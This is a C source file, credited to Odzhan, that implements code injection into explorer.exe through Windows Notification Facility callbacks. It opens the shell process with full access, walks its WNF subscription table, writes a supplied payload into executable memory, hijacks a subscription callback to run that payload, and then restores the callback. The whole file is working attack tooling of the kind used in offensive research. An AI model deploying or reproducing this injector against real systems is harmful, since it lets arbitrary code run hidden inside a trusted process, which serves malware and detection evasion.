/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#include "../ntlib/util.h"
#include "wnf.h"

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")

#define WNF_SHEL_APPLICATION_STARTED            0x0d83063ea3be0075

typedef NTSTATUS
(NTAPI *NtUpdateWnfStateData_t)(
    _In_ PVOID StateName,
    _In_reads_bytes_opt_(Length) const VOID *Buffer,
    _In_opt_ ULONG Length,
    _In_opt_ PCWNF_TYPE_ID TypeId,
    _In_opt_ const VOID *ExplicitScope,
    _In_ WNF_CHANGE_STAMP MatchingChangeStamp,
    _In_ LOGICAL CheckStamp);
    
LPVOID GetUserSubFromTable(
    HANDLE                 hp, 
    LPVOID                 addr,
    PWNF_USER_SUBSCRIPTION us,
    ULONG64                sn)
{
    BOOL                   bRead;
    SIZE_T                 rd;
    LIST_ENTRY             stle, nsle, *nte, *use;
    WNF_NAME_SUBSCRIPTION  ns;
    PBYTE                  p;
    ULONG64                x;
    LPVOID                 sa = NULL;

    // read NamesTableEntry into local memory
    ReadProcessMemory(
      hp, 
      (PBYTE)addr + offsetof(WNF_SUBSCRIPTION_TABLE, NamesTableEntry), 
      &stle, sizeof(stle), &rd);
     
    // for each name subscription
    nte = stle.Flink;
    for(;;) {    
      // read WNF_NAME_SUBSCRIPTION into local memory    
      p = (PBYTE)nte - offsetof(WNF_NAME_SUBSCRIPTION, NamesTableEntry);
      bRead = ReadProcessMemory(
        hp, (PBYTE)p, &ns, sizeof(ns), &rd);
      if(!bRead) break;
      
      x = *(ULONG64*)&ns.StateName;
      // is it our user subcription?
      if(x == sn) {
        // read first entry and exit loop
        use = ns.SubscriptionsListHead.Flink;
        // read WNF_USER_SUBSCRIPTION into local memory
        sa = (PBYTE)use - offsetof(WNF_USER_SUBSCRIPTION, SubscriptionsListEntry);
        ReadProcessMemory(
          hp, (PBYTE)sa, us, sizeof(WNF_USER_SUBSCRIPTION), &rd);
        break;
      }
      // last one? break from loop
      if(nte == stle.Blink) break;
        
      // read LIST_ENTRY
      bRead = ReadProcessMemory(
        hp, (PBYTE)nte, &nsle, sizeof(nsle), &rd);
      if(!bRead) break;
      
      nte = nsle.Flink;
    }
    return sa;
}

// try find the subscription table by header
// returns TRUE if found, else FALSE
LPVOID FindWnfSubTable(
    HANDLE                    hp, 
    PMEMORY_BASIC_INFORMATION mbi,
    PWNF_USER_SUBSCRIPTION    us,
    ULONG64                   sn) 
{
    SIZE_T                 pos;
    SIZE_T                 rd;
    WNF_SUBSCRIPTION_TABLE st;
    LPVOID                 sa = NULL;
    
    for(pos = 0;
        pos < (mbi->RegionSize - sizeof(WNF_SUBSCRIPTION_TABLE));
        pos++) 
    {  
      // try read size of table
      ReadProcessMemory(
        hp, (PBYTE)mbi->BaseAddress + pos, &st, 
        sizeof(WNF_SUBSCRIPTION_TABLE), &rd);

      if(rd != sizeof(WNF_SUBSCRIPTION_TABLE)) break;

        // found WNF table?
      if(st.Header.NodeTypeCode == WNF_NODE_SUBSCRIPTION_TABLE && 
         st.Header.NodeByteSize == sizeof(WNF_SUBSCRIPTION_TABLE)) {
        // read user subscription for state name
        sa = GetUserSubFromTable(hp, (PBYTE)mbi->BaseAddress + pos, us, sn);
        break;
      }
    }
    return sa;
}

// this method searches all writeable areas of memory for the WNF table
// much slower than version searching data segment
LPVOID GetUserSubFromProcessOld(
  HANDLE hp, PWNF_USER_SUBSCRIPTION us, ULONG64 sn) 
{
    SYSTEM_INFO              si;
    MEMORY_BASIC_INFORMATION mbi;
    LPBYTE                   addr;
    SIZE_T                   res;
    LPVOID                   sa = NULL;
    
    GetSystemInfo(&si);
      
    for(addr = 0; 
        addr < (LPBYTE)si.lpMaximumApplicationAddress;
        addr = (PBYTE)mbi.BaseAddress + mbi.RegionSize) 
    {
      ZeroMemory(&mbi, sizeof(mbi));
      res = VirtualQueryEx(hp, addr, &mbi, sizeof(mbi));
      if(res != sizeof(mbi)) break;
        
      // heap memory? (can be stack too)
      if ((mbi.State   == MEM_COMMIT)  &&
          (mbi.Type    == MEM_PRIVATE) && 
          (mbi.Protect == PAGE_READWRITE))  
      {
        // try find user sub in this block
        sa = FindWnfSubTable(hp, &mbi, us, sn);
        if(sa != NULL) break;
      }
    }
    return sa;
}

LPVOID GetModuleHandleRemote(DWORD pid, LPCWSTR lpModuleName) {
    HANDLE        ss;
    MODULEENTRY32 me;
    LPVOID        ba = NULL;
    
    ss = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    
    if(ss == INVALID_HANDLE_VALUE) return NULL;
    
    me.dwSize = sizeof(MODULEENTRY32);
    
    if(Module32First(ss, &me)) {
      do {
        if(me.th32ProcessID == pid) {
          if(lstrcmpi(me.szModule, lpModuleName)==0) {
            ba = me.modBaseAddr;
            break;
          }
        }
      } while(Module32Next(ss, &me));
    }
    CloseHandle(ss);
    return ba;
}

// Relative Virtual Address to Virtual Address
#define RVA2VA(type, base, rva) (type)((ULONG_PTR) base + rva)

LPVOID GetUserSubFromProcess(
  HANDLE hp, DWORD pid, PWNF_USER_SUBSCRIPTION us, ULONG64 sn)
{
    LPVOID                   ntdll, sa = NULL;
    PIMAGE_DOS_HEADER        dos;
    PIMAGE_NT_HEADERS        nt;
    PIMAGE_SECTION_HEADER    sh;
    DWORD                    i, j, res, rva = 0;
    LPBYTE                   ds;
    MEMORY_BASIC_INFORMATION mbi;
    PWNF_SUBSCRIPTION_TABLE  tbl;
    ULONG_PTR                ptr;
    SIZE_T                   rd;
    WNF_SUBSCRIPTION_TABLE   st;
    
    // Storage Protection Windows Runtime automatically subscribes to WNF. 
    // Loading efswrt.dll will create the table if not already initialized.
    // Search the data segment of NTDLL and obtain the Relative Virtual Address of WNF table
    // Read the base address of NTDLL from remote process and add to RVA
    // Read pointer to heap in remote process.
    // Finally, read a user subscription
    LoadLibrary(L"efswrt.dll");
    // get local RVA of subscription table
    ntdll = GetModuleHandle(L"ntdll.dll");

    dos = (PIMAGE_DOS_HEADER)ntdll;  
    nt  = RVA2VA(PIMAGE_NT_HEADERS, ntdll, dos->e_lfanew);  
    sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
            nt->FileHeader.SizeOfOptionalHeader);
             
    // scan all writeable segments
    for(i=0; i<nt->FileHeader.NumberOfSections && rva == 0; i++) {
      // if this section is writeable, assume it's data
      if (sh[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
        // scan section for pointers to the heap
        ds = RVA2VA(PBYTE, ntdll, sh[i].VirtualAddress);
         
        for(j = 0; 
            j < sh[i].Misc.VirtualSize - sizeof(ULONG_PTR); 
            j += sizeof(ULONG_PTR)) 
        {
          // get pointer
          ptr = *(ULONG_PTR*)&ds[j];
          // query the memory
          res = VirtualQuery((LPVOID)ptr, &mbi, sizeof(mbi));
          if(res != sizeof(mbi)) continue;
          
          // if it's a pointer to heap or stack..
          if ((mbi.State   == MEM_COMMIT    ) &&
              (mbi.Type    == MEM_PRIVATE   ) && 
              (mbi.Protect == PAGE_READWRITE))
          {
            tbl = (PWNF_SUBSCRIPTION_TABLE)ptr;
            // if it looks like subscription table resides here
            if(tbl->Header.NodeTypeCode == WNF_NODE_SUBSCRIPTION_TABLE && 
               tbl->Header.NodeByteSize == sizeof(WNF_SUBSCRIPTION_TABLE)) 
            {
              // save the Relative Virtual Address
              rva = (DWORD)(sh[i].VirtualAddress + j);
              break;
            }
          }
        }
      }
    }
    // we found table locally?
    if(rva != 0) {
      // get base address of NTDLL in remote process
      ntdll = GetModuleHandleRemote(pid, L"ntdll.dll");
      if(ntdll != NULL) {
        // read the heap pointer from remote process
        ReadProcessMemory(
          hp, (PBYTE)ntdll + rva, &ptr,
          sizeof(ULONG_PTR), &rd);
          
        // read a user subscription from remote
        sa = GetUserSubFromTable(hp, (LPVOID)ptr, us, sn);
      }
    }
    return sa;
}
    
VOID wnf_inject(LPVOID payload, DWORD payloadSize) {
    WNF_USER_SUBSCRIPTION  us;
    LPVOID                 sa, cs;
    HWND                   hw;
    HANDLE                 hp;
    DWORD                  pid;
    SIZE_T                 wr;
    ULONG64                ns = WNF_SHEL_APPLICATION_STARTED;
    NtUpdateWnfStateData_t _NtUpdateWnfStateData;
    HMODULE                m;
      
    // 1. Open explorer.exe
    hw = FindWindow(L"Shell_TrayWnd", NULL);
    GetWindowThreadProcessId(hw, &pid);
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    
    // 2. Locate user subscription
    sa = GetUserSubFromProcess(hp, pid, &us, WNF_SHEL_APPLICATION_STARTED);
    
    // 3. Allocate RWX memory and write payload
    cs = VirtualAllocEx(hp, NULL, payloadSize,
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
    
    // 4. Update callback and trigger execution of payload
    WriteProcessMemory(
      hp, 
      (PBYTE)sa + offsetof(WNF_USER_SUBSCRIPTION, Callback), 
      &cs,
      sizeof(ULONG_PTR),
      &wr);
      
    m = GetModuleHandle(L"ntdll");
    _NtUpdateWnfStateData = 
      (NtUpdateWnfStateData_t)GetProcAddress(m, "NtUpdateWnfStateData");
      
    _NtUpdateWnfStateData(
      &ns, NULL, 0, 0, NULL, 0, 0);
    
    // 
    Sleep(0);
    
    // 5. Restore original callback, free memory and close process
    WriteProcessMemory(
      hp, 
      (PBYTE)sa + offsetof(WNF_USER_SUBSCRIPTION, Callback), 
      &us.Callback,
      sizeof(ULONG_PTR),
      &wr);
    
    VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
    CloseHandle(hp);
}

int wmain(int argc, wchar_t *argv[]) {
    LPVOID payload;
    DWORD  pid, payloadSize;
    
    if(argc != 2) {
      wprintf(L"usage: wnf <payload>\n");
      return 0;
    }
    // read payload
    payloadSize = readpic(argv[1], &payload);
    if(payloadSize == 0) { wprintf(L"unable to read from %s\n", argv[1]); return 0; }
    
    // inject payload
    wnf_inject(payload, payloadSize);
    return 0;
}